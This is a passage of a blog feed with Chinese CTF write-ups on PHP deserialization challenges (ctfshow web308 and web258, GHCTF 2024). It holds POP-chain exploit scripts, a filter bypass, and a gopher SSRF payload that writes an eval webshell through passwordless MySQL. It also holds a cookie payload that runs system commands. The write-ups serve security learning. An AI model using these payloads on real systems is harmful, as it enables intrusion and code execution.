&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//【config.php】</span><br><span class="line">class config&#123;</span><br><span class="line">    private $mysql_username=&#x27;root&#x27;;</span><br><span class="line">    //没有密码！！！！！</span><br><span class="line">    private $mysql_password=&#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">    public $update_url = &#x27;https://vip.ctf.show/version.txt&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//【fun.php】</span><br><span class="line">function checkUpdate($url)&#123;</span><br><span class="line">        $ch=curl_init();    </span><br><span class="line">        //...</span><br><span class="line">        $res = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得出我们可以使用SSRF打无密码的mysql。SSRF的payload由<code>/index.php</code>反序列化传入。</p><p>8.反序列化POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class dao&#123;</span><br><span class="line">    private $config;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">    $this-&gt;config=new config();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class config&#123;</span><br><span class="line">     public $update_url = &#x27;SSRF打无密码mysql的payload&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Gopherus工具对应文件夹开cmd控制台。工具下载地址<code>https://github.com/tarunkant/Gopherus</code></p><p>9.kali下载Gopherus工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/tarunkant/Gopherus</span><br></pre></td></tr></table></figure><p>10.运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure><p>username:root</p><p>execute:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;;</span><br></pre></td></tr></table></figure><p>得到SSRFpayload：</p><p>gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%01%00%00%00%01</p><p>11.得到payload在index.php执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service=TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo3NjM6ImdvcGhlcjovLzEyNy4wLjAuMTozMzA2L18lYTMlMDAlMDAlMDElODUlYTYlZmYlMDElMDAlMDAlMDAlMDElMjElMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlNzIlNmYlNmYlNzQlMDAlMDAlNmQlNzklNzMlNzElNmMlNWYlNmUlNjElNzQlNjklNzYlNjUlNWYlNzAlNjElNzMlNzMlNzclNmYlNzIlNjQlMDAlNjYlMDMlNWYlNmYlNzMlMDUlNGMlNjklNmUlNzUlNzglMGMlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNmUlNjElNmQlNjUlMDglNmMlNjklNjIlNmQlNzklNzMlNzElNmMlMDQlNWYlNzAlNjklNjQlMDUlMzIlMzclMzIlMzUlMzUlMGYlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNzYlNjUlNzIlNzMlNjklNmYlNmUlMDYlMzUlMmUlMzclMmUlMzIlMzIlMDklNWYlNzAlNmMlNjElNzQlNjYlNmYlNzIlNmQlMDYlNzglMzglMzYlNWYlMzYlMzQlMGMlNzAlNzIlNmYlNjclNzIlNjElNmQlNWYlNmUlNjElNmQlNjUlMDUlNmQlNzklNzMlNzElNmMlNDYlMDAlMDAlMDAlMDMlNzMlNjUlNmMlNjUlNjMlNzQlMjAlMjIlM2MlM2YlNzAlNjglNzAlMjAlNjUlNzYlNjElNmMlMjglMjQlNWYlNTAlNGYlNTMlNTQlNWIlMzElNWQlMjklM2IlM2YlM2UlMjIlMjAlNjklNmUlNzQlNmYlMjAlNmYlNzUlNzQlNjYlNjklNmMlNjUlMjAlMjIlMmYlNzYlNjElNzIlMmYlNzclNzclNzclMmYlNjglNzQlNmQlNmMlMmYlMzElMmUlNzAlNjglNzAlMjIlM2IlMDElMDAlMDAlMDAlMDEiO319</span><br></pre></td></tr></table></figure><p>12.访问1.php,post执行命令得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h1 id=&quot;CTFshow-代码审计-web308&quot;&gt;&lt;a href=&quot;#CTFshow-代码审计-web308&quot; class=&quot;headerlink&quot; title=&quot;CTFshow 代码审计 web308&quot;&gt;&lt;/a&gt;CTFshow 代码审计 web</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[GHCTF 2024 新生赛]ezzz_unserialize</title>
    <link href="http://1768161086.github,io/2025/02/18/GHCTF-2024-%E6%96%B0%E7%94%9F%E8%B5%9B-ezzz-unserialize/"/>
    <id>http://1768161086.github,io/2025/02/18/GHCTF-2024-%E6%96%B0%E7%94%9F%E8%B5%9B-ezzz-unserialize/</id>
    <published>2025-02-18T11:53:01.000Z</published>
    <updated>2025-02-18T12:07:44.741Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h1 id="GHCTF-2024-新生赛-ezzz-unserialize"><a href="#GHCTF-2024-新生赛-ezzz-unserialize" class="headerlink" title="[GHCTF 2024 新生赛]ezzz_unserialize"></a>[GHCTF 2024 新生赛]ezzz_unserialize</h1></blockquote><p>1.题目源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * @Author: hey</span><br><span class="line"> * @message: Patience is the key in life,I think you&#x27;ll be able to find vulnerabilities in code audits.</span><br><span class="line"> * Have fun and Good luck!!!</span><br><span class="line"> */</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Sakura&#123;</span><br><span class="line">    public $apple;</span><br><span class="line">    public $strawberry;</span><br><span class="line">    public function __construct($a)&#123;</span><br><span class="line">        $this -&gt; apple = $a;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $new = $this -&gt; strawberry;</span><br><span class="line">        return $new();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class NoNo &#123;</span><br><span class="line">    private $peach;</span><br><span class="line"></span><br><span class="line">    public function __construct($string) &#123;</span><br><span class="line">        $this -&gt; peach = $string;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($name) &#123;</span><br><span class="line">        $var = $this -&gt; $name;</span><br><span class="line">        $var[$name]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class BasaraKing&#123;</span><br><span class="line">    public $orange;</span><br><span class="line">    public $cherry;</span><br><span class="line">    public $arg1;</span><br><span class="line">    public function __call($arg1,$arg2)&#123;</span><br><span class="line">        $function = $this -&gt; orange;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($arg1)</span><br><span class="line">    &#123;</span><br><span class="line">        $this -&gt; cherry -&gt; ll2(&#x27;b2&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class UkyoTachibana&#123;</span><br><span class="line">    public $banana;</span><br><span class="line">    public $mangosteen;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $long = @$this -&gt; banana -&gt; add();</span><br><span class="line">        return $long;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($arg1,$arg2)</span><br><span class="line">    &#123;</span><br><span class="line">        if($this -&gt; mangosteen -&gt; tt2)</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;Sakura was the best!!!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class E&#123;</span><br><span class="line">    public $e;</span><br><span class="line">    public function __get($arg1)&#123;</span><br><span class="line">        array_walk($this, function ($Monday, $Tuesday) &#123;</span><br><span class="line">            $Wednesday = new $Tuesday($Monday);</span><br><span class="line">            foreach($Wednesday as $Thursday)&#123;</span><br><span class="line">                echo ($Thursday.&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class UesugiErii&#123;</span><br><span class="line">    protected $coconut;</span><br><span class="line"></span><br><span class="line">    protected function addMe() &#123;</span><br><span class="line">        return &quot;My time with Sakura was my happiest time&quot;.$this -&gt; coconut;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($func, $args) &#123;</span><br><span class="line">        call_user_func([$this, $func.&quot;Me&quot;], $args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Heraclqs&#123;</span><br><span class="line">    public $grape;</span><br><span class="line">    public $blueberry;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        if(md5(md5($this -&gt; blueberry)) == 123) &#123;</span><br><span class="line">            return $this -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MaiSakatoku&#123;</span><br><span class="line">    public $Carambola;</span><br><span class="line">    private $Kiwifruit;</span><br><span class="line"></span><br><span class="line">    public function __set($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this -&gt; $name = $value;</span><br><span class="line">        if ($this -&gt; Kiwifruit = &quot;Sakura&quot;)&#123;</span><br><span class="line">            strtolower($this-&gt; Carambola);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;GHCTF&#x27;])) &#123;</span><br><span class="line">    unserialize($_POST[&#x27;GHCTF&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.首先查找关键点所在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class E&#123;</span><br><span class="line">    public $e;</span><br><span class="line">    public function __get($arg1)&#123;</span><br><span class="line">        array_walk($this, function ($Monday, $Tuesday) &#123;</span><br><span class="line">            $Wednesday = new $Tuesday($Monday);</span><br><span class="line">            foreach($Wednesday as $Thursday)&#123;</span><br><span class="line">                echo ($Thursday.&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中array_walk函数：对数组中的每一个元素应用用户所自定义的函数</p><p>3.接下来构造pop链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E::__get -&gt; Heraclqs::__invoke -&gt; Sakura::__toString -&gt; Sakura::__destruct</span><br></pre></td></tr></table></figure><p>Heraclqs::__invoke中有一个弱比较：双md5加密后要等于123</p><p>爆破以下即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">port hashlib</span><br><span class="line">import itertools</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">for i in itertools.product(string.printable, repeat=3):</span><br><span class="line">    s = &#x27;&#x27;.join(i)</span><br><span class="line">    s1 = hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">    s2 = hashlib.md5(s1.encode()).hexdigest()</span><br><span class="line">    if s2[:3] == &#x27;123&#x27;:</span><br><span class="line">        print(s)</span><br><span class="line"></span><br><span class="line">dY1</span><br><span class="line">esW</span><br><span class="line">f0w</span><br><span class="line">fpr</span><br><span class="line">i2x</span><br><span class="line">jA4</span><br><span class="line">l4c</span><br><span class="line">msj</span><br><span class="line">ouK</span><br><span class="line">v94</span><br><span class="line">x3Q</span><br><span class="line">za4</span><br><span class="line">Bp7</span><br><span class="line">BsC</span><br><span class="line">Cit</span><br><span class="line">F1J</span><br><span class="line">GJN</span><br><span class="line">Iyf</span><br><span class="line">OgK</span><br><span class="line">V0E</span><br><span class="line">X02</span><br><span class="line">XGd</span><br></pre></td></tr></table></figure><p>4.编写exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class E&#123;</span><br><span class="line">    public $e;</span><br><span class="line">&#125;</span><br><span class="line">class Heraclqs&#123;</span><br><span class="line">    public $grape;</span><br><span class="line">    public $blueberry;</span><br><span class="line">&#125;</span><br><span class="line">class Sakura&#123;</span><br><span class="line">    public $apple;</span><br><span class="line">    public $strawberry;</span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line">$a1=new E;</span><br><span class="line">$a1-&gt;FilesystemIterator=&#x27;/&#x27;;</span><br><span class="line"></span><br><span class="line">$a2 = new Heraclqs;</span><br><span class="line">$a2-&gt;blueberry=&#x27;LLh&#x27;;</span><br><span class="line">$a2-&gt;grape=$a1;</span><br><span class="line"></span><br><span class="line">$a3=new Sakura;</span><br><span class="line">$a3-&gt;strawberry=$a2;</span><br><span class="line"></span><br><span class="line">$a4 = new Sakura;</span><br><span class="line">$a4-&gt;apple=$a3;</span><br><span class="line">echo serialize($a4)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>5.获取flag目录文件后读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h1 id=&quot;GHCTF-2024-新生赛-ezzz-unserialize&quot;&gt;&lt;a href=&quot;#GHCTF-2024-新生赛-ezzz-unserialize&quot; class=&quot;headerlink&quot; title=&quot;[GHCTF 2024 新生赛]e</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ctfshow_web258</title>
    <link href="http://1768161086.github,io/2025/02/13/ctfshow-web258/"/>
    <id>http://1768161086.github,io/2025/02/13/ctfshow-web258/</id>
    <published>2025-02-13T09:25:11.000Z</published>
    <updated>2025-02-15T09:33:28.634Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h2 id="ctfshow-web258"><a href="#ctfshow-web258" class="headerlink" title="ctfshow_web258"></a>ctfshow_web258</h2></blockquote><p>1.题目源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line">    public $class = &#x27;info&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class=new info();</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class info&#123;</span><br><span class="line">    public $user=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        return $this-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class backDoor&#123;</span><br><span class="line">    public $code;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    if(!preg_match(&#x27;/[oc]:\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123;</span><br><span class="line">        $user = unserialize($_COOKIE[&#x27;user&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">    $user-&gt;login($username,$password);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.思路：在ctfShowUser类中利用__destruct()执行backDoor类的getInfo()方法，从而实现代码注入攻击。</p><p>类中的**getinfo()**方法通常用于获取一些信息。</p><p>3.ctfShowUser一定要，最后要login，info应该不能要，会为user赋值，就不能用user把需要的代码传入了，这里面没有与flag有关的代码，可能就要读取其中的文件了</p><p>用backDoor中的code传入一句话木马（把ctfShowUser中的info改成backDoor）<br>另外还有一个正则表达式：<code>/[oc]:\d+:/i</code>。意思是过滤这两种情况：<code>o:数字:</code>与<code>c:数字:</code><br>这种情况是用<code>+(加号)</code>绕过的，如：<code>o:+</code></p><p>4.构造exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line">    public $class = &#x27;info&#x27;;</span><br><span class="line"> </span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class=new backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class backDoor&#123;</span><br><span class="line">    public $code=&#x27;system(&quot;tac ./flag.php&quot;);&#x27;;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c=serialize(new ctfShowUser);</span><br><span class="line">$b=str_replace(&#x27;:11&#x27;,&#x27;:+11&#x27;,$c);</span><br><span class="line">$b=str_replace(&#x27;:8&#x27;,&#x27;:+8&#x27;,$b);</span><br><span class="line">echo(urlencode($b));</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $class = &#x27;backDoor&#x27;;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class=new backDoor();</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">class backDoor&#123;</span><br><span class="line">    public $code=&#x27;system(&quot;cat f*&quot;);&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a = serialize(new ctfShowUser());</span><br><span class="line">$a = str_replace(&#x27;O:&#x27;,&#x27;O:+&#x27;,$a);</span><br><span class="line">echo urlencode($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>5.payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx      (随便什么)</span><br><span class="line"> </span><br><span class="line">Cookie:user=O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A25%3A%22system%28%22tac+.%2Fflag.php%22%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h2 id=&quot;ctfshow-web258&quot;&gt;&lt;a href=&quot;#ctfshow-web258&quot; class=&quot;headerlink&quot; title=&quot;ctfshow_web258&quot;&gt;&lt;/a&gt;ctfshow_web258&lt;/h2&gt;&lt;/blockquote</summary>
      
    
    
    
    
    <category term="web" scheme="http://1768161086.github,io/tags/web/"/>
    
    <category term="原创" scheme="http://1768161086.github,io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="反序列化" scheme="http://1768161086.github,io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>[MoeCTF 2021]unserialize</title>
    <link href="http://1768161086.github,io/2025/02/12/MoeCTF-2021-unserialize/"/>
    <id>http://1768161086.github,io/2025/02/12/MoeCTF-2021-unserialize/</id>
    <published>2025-02-12T09:08:36.000Z</published>
    <updated>2025-02-15T09:17:10.506Z</updated>
    
